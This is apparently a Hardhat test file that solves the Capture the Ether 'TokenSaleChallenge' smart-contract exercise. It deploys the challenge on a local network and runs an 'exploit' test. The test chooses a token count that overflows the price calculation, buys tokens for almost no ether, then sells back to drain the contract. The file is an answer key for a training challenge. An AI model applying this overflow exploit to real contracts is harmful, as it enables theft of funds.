import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect, util } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';
const { utils } = ethers;

describe('TokenSaleChallenge', () => {
  let target: Contract;
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('TokenSaleChallenge', deployer)
    ).deploy(attacker.address, {
      value: utils.parseEther('1'),
    });

    await target.deployed();

    target = target.connect(attacker);
  });

  it('exploit', async () => {
    const tokenPrice = utils.parseEther('1');
    const ethToSteal = ethers.constants.MaxUint256.mod(tokenPrice);

    const numTokens = ethers.constants.MaxUint256.sub(ethToSteal).div(tokenPrice).add(1);
    const ethToSend = tokenPrice.sub(ethToSteal).sub(1);

    await target.buy(numTokens, { value: ethToSend });

    const etherToWithdraw = await ethers.provider.getBalance(target.address);
    target.sell(etherToWithdraw.div(utils.parseEther('1')));

    expect(await target.isComplete()).to.equal(true);
  });
});
